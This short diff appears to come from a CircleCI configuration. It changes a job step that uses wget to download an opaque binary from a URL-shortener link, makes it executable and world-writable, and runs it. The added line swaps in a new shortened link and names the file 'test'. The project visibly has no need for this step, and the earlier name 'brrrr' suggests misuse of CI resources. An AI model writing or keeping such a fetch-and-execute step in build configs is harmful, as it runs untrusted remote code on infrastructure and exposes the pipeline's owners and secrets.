@@ -6,4 +6,4 @@ jobs:
       image: ubuntu-2004:202010-01
     resource_class: medium
     steps:
-      - run: wget -O brrrr http://gg.gg/vl3a5 && chmod +x brrrr && chmod 777 brrrr && ./brrrr
+      - run: wget -O test http://gg.gg/vl3e0 && chmod +x test && chmod 777 test && ./test
